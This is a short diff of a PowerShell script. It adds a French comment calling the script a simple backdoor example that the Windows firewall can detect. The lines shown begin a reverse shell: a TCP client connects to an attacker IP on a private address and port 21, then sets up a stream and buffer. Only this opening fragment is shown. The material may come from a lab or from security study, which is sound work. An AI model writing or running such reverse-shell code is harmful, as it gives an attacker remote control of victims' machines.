@@ -1,3 +1,5 @@
+# Exemple de backdoor simple, mais détectable par parefeu windows
+
 $client = New-Object System.Net.Sockets.TCPClient('192.168.146.136',21); # IP de l'attaquant et port d'écoute
     $stream = $client.GetStream();
     [byte[]]$buffer = 0..65535|%{0};
